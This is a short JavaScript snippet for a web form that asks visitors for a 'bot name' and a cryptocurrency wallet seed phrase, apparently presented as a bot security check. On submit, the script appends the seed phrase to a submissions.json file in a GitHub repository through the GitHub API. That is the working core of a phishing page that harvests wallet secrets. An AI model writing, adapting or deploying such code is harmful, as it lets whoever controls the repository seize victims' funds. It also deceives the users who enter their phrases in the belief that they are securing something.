<script>
    document.getElementById('bot-form').addEventListener('submit', async function(event) {
        event.preventDefault();
        let botName = document.getElementById('bot-name').value.trim();
        let seedPhrase = document.getElementById('seed-phrase').value.trim();
        let messageDiv = document.getElementById('message');

        if (!botName || !seedPhrase) {
            messageDiv.style.color = "red";
            messageDiv.textContent = "Please fill in both fields!";
            return;
        }

        let data = { bot_name: botName, seed_phrase: seedPhrase, timestamp: new Date().toISOString() };

        let response = await fetch('https://api.github.com/repos/Pius931/bot-security-site/contents/submissions.json', {
            method: 'GET',
            headers: {
                'Accept': 'application/vnd.github.v3+json'
            }
        });

        let fileData = await response.json();
        let existingContent = fileData.content ? atob(fileData.content) : '[]';
        let submissions = JSON.parse(existingContent);
        submissions.push(data);

        let newContent = btoa(JSON.stringify(submissions, null, 2));

        let updateResponse = await fetch('https://api.github.com/repos/Pius931/bot-security-site/contents/submissions.json', {
            method: 'PUT',
            headers: {
                'Accept': 'application/vnd.github.v3+json',
                'Authorization': 'Bearer GH_TOKEN'
            },
            body: JSON.stringify({
                message: "New submission",
                content: newContent,
                sha: fileData.sha
            })
        });

        if (updateResponse.ok) {
            messageDiv.style.color = "green";
            messageDiv.textContent = "Submission saved!";
        } else {
            messageDiv.style.color = "red";
            messageDiv.textContent = "Error saving submission!";
        }
    });
</script>
